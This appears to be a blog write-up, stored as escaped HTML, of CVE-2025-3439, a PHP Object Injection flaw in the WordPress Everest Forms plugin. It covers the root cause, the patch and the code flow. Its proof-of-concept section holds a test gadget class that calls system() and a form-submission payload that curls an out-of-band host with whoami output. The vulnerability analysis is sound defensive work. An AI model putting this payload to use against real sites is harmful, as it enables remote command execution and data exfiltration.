      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin Everest Forms – Contact Form, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder for WordPress&lt;/strong&gt; on WordPress contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;3.1.1&lt;/strong&gt;, through unsafe unserialization of untrusted data from the parameter &lt;code&gt;field_value&lt;/code&gt;.&#xA;This allows an &lt;strong&gt;unauthenticated attacker&lt;/strong&gt; to inject a PHP object. The vulnerable software &lt;strong&gt;does not contain any known POP chain&lt;/strong&gt;, meaning the flaw will not lead to practical exploitation unless another plugin or theme on the website contains a compatible POP chain.&#xA;If such a POP chain exists through an additional plugin or theme installed on the target system, it may allow the attacker to perform actions such as &lt;strong&gt;arbitrary file deletion&lt;/strong&gt;, &lt;strong&gt;data theft&lt;/strong&gt;, or even &lt;strong&gt;remote code execution&lt;/strong&gt;, depending on the available POP chain.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3439&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v3.1.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;    if ( is_serialized( $field_value ) ) {&#xA;        $field_value = maybe_unserialize( $field_value );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this snippet, &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; is directly executed on user-provided input (&lt;code&gt;$field_value&lt;/code&gt;). This introduces a critical risk:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection Risk&lt;/strong&gt;: If the attacker embeds a PHP object payload within serialized data, the decode and unserialize process will instantiate a malicious object, potentially leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and escalation towards &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Missing safety validation&lt;/strong&gt;: No data validation is performed before unserialization.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback handling&lt;/strong&gt;: If the input is invalid or malicious, no alternative error processing is performed, leaving the system open to exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;The patch (v3.1.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#39; alt=&#34;Diff&#34; height=&#34;243&#34; width=&#34;1831&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch replaces &lt;code&gt;maybe_unserialize()&lt;/code&gt; with a safer function &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function evf_maybe_unserialize( $data, $options = array() ) {&#xA;    if ( is_serialized( $data ) ) {&#xA;        if ( version_compare( PHP_VERSION, &amp;#39;7.1.0&amp;#39;, &amp;#39;&amp;gt;=&amp;#39; ) ) {&#xA;            $options = wp_parse_args( $options, array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;            return @unserialize( trim( $data ), $options ); //phpcs:ignore.&#xA;        }&#xA;        return @unserialize( trim( $data ) ); //phpcs:ignore.&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt; completely removes the ability to instantiate objects, effectively eliminating the vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers a submenu &lt;code&gt;Entries&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page( &amp;#39;everest-forms&amp;#39;, esc_html__( &amp;#39;Everest Forms Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), esc_html__( &amp;#39;Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), current_user_can( &amp;#39;everest_forms_view_entries&amp;#39; ) ? &amp;#39;everest_forms_view_entries&amp;#39; : &amp;#39;everest_forms_view_others_entries&amp;#39;, &amp;#39;evf-entries&amp;#39;, array( $this, &amp;#39;entries_page&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Callback &lt;code&gt;entries_page&lt;/code&gt; is executed when accessing this submenu:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function entries_page() {&#xA;    EVF_Admin_Entries::page_output();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function calls &lt;code&gt;page_output()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function page_output() {&#xA;    if ( apply_filters( &amp;#39;everest_forms_entries_list_actions&amp;#39;, false ) ) {&#xA;        do_action( &amp;#39;everest_forms_entries_list_actions_execute&amp;#39; );&#xA;    } elseif ( isset( $_GET[&amp;#39;view-entry&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        include &amp;#39;views/html-admin-page-entries-view.php&amp;#39;;&#xA;    } else {&#xA;        self::table_list_output();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When &lt;code&gt;$_GET[&#39;view-entry&#39;]&lt;/code&gt; exists, the view &lt;code&gt;html-admin-page-entries-view.php&lt;/code&gt; is included.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#34; title=&#34;Entries Page&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/entries.png&#34; data-sub-html=&#34;&lt;h2&gt;Entries&lt;/h2&gt;&lt;p&gt;Entries Page&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#39; alt=&#34;Entries&#34; height=&#34;998&#34; width=&#34;1231&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entries Page&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This page displays all submitted form input.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$entry_meta = apply_filters( &amp;#39;everest_forms_entry_single_data&amp;#39;, $entry-&amp;gt;meta, $entry, $form_data );&#xA;...&#xA;foreach ( $entry_meta as $meta_key =&amp;gt; $meta_value ) {&#xA;    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );&#xA;    if ( evf_is_json( $meta_value ) ) {&#xA;        $meta_value = json_decode( $meta_value, true );&#xA;        $meta_value = $meta_value[&amp;#39;value&amp;#39;];&#xA;    }&#xA;    ...&#xA;    $field_value     = apply_filters( &amp;#39;everest_forms_html_field_value&amp;#39;, $meta_value, $entry_meta[ $meta_key ], $entry_meta, &amp;#39;entry-single&amp;#39; );&#xA;    ...&#xA;    if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;        if ( is_serialized( $field_value ) ) {&#xA;            $field_value = maybe_unserialize( $field_value );&#xA;        }&#xA;        ...&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$entry_meta&lt;/code&gt; represents user-submitted form data. Each item contains a &lt;code&gt;meta_key&lt;/code&gt; and a &lt;code&gt;meta_value&lt;/code&gt;, and the system loops through them:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If the value is JSON&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;evf_is_json()&lt;/code&gt; determines whether the string is valid JSON.&lt;/li&gt;&#xA;&lt;li&gt;If yes, &lt;code&gt;json_decode()&lt;/code&gt; extracts the decoded content via &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Then &lt;code&gt;$field_value&lt;/code&gt; is generated&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Passed through the filter &lt;code&gt;everest_forms_html_field_value&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If serialized&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is used to decode it — this is the security flaw.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;User submits form → Data stored in $entry_meta&amp;#34;] --&amp;gt; B[&amp;#34;Admin opens Entries page in wp-admin&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;entries_page() executed&amp;#34;]&#xA;C --&amp;gt; D{&amp;#34;GET[&amp;#39;view-entry&amp;#39;] exists?&amp;#34;}&#xA;D --&amp;gt;|No| Z[&amp;#34;Show entries table&amp;#34;]&#xA;D --&amp;gt;|Yes| E[&amp;#34;Load html-admin-page-entries-view.php&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;foreach ($entry_meta as meta_key =&amp;gt; meta_value)&amp;#34;]&#xA;F --&amp;gt; G{&amp;#34;Is meta_value JSON?&amp;#34;}&#xA;G --&amp;gt;|Yes| H[&amp;#34;json_decode() → meta_value[&amp;#39;value&amp;#39;]&amp;#34;]&#xA;G --&amp;gt;|No| I[&amp;#34;meta_value = wp_strip_all_tags()&amp;#34;]&#xA;&#xA;H --&amp;gt; J[&amp;#34;field_value = apply_filters(&amp;#39;everest_forms_html_field_value&amp;#39;, meta_value, ...)&amp;#34;]&#xA;I --&amp;gt; J&#xA;&#xA;J --&amp;gt; K{&amp;#34;field_value is serialized?&amp;#34;}&#xA;K --&amp;gt;|No| L[&amp;#34;Display value normally&amp;#34;]&#xA;K --&amp;gt;|Yes| M[&amp;#34;maybe_unserialize(field_value) ← Vulnerable&amp;#34;]&#xA;&#xA;M --&amp;gt; N{&amp;#34;Unserialize produces object?&amp;#34;}&#xA;N --&amp;gt;|Yes| R[&amp;#34;Object Injection → Possible exploit if POP chain exists&amp;#34;]&#xA;N --&amp;gt;|No| L&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Submit a form with JSON-encoded serialized payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /2025/11/22/test/ HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;Content-Disposition: form-data; name=&amp;#34;everest_forms[form_fields][fullname]&amp;#34;&#xA;&#xA;{&amp;#34;value&amp;#34;:&amp;#34;a:1:{i:0;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\&amp;#34;;}}&amp;#34;}&#xA;------geckoformboundary8355bd6da3783bb27aa92837fe803a6e&#xA;...&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Administrator opens the entry:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/result.png&#39; alt=&#34;Result&#34; height=&#34;614&#34; width=&#34;1119&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability exists because &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt; is used directly on user-supplied data without restricting which PHP classes may be instantiated&lt;/strong&gt;, leading to &lt;strong&gt;PHP Object Injection&lt;/strong&gt;. If a POP chain is present in another plugin or theme, an unauthenticated attacker may escalate to dangerous actions such as reading/writing/deleting files or even remote code execution.&#xA;The patch uses &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; with &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt;, fully neutralizing the issue.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Root cause&lt;/strong&gt;: Use of &lt;code&gt;maybe_unserialize()&lt;/code&gt; on user-controlled data without restricting classes.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Impact&lt;/strong&gt;: Object Injection, potentially RCE if a compatible POP chain exists.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Attack surface&lt;/strong&gt;: Triggered when an admin opens the Entries page; malicious payload is already stored.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Fix&lt;/strong&gt;: Use &lt;code&gt;unserialize()&lt;/code&gt; with &lt;code&gt;allowed_classes = false&lt;/code&gt;, preventing object creation.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lesson learned&lt;/strong&gt;: Any unserialization must restrict allowed classes or switch to safer formats like JSON.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 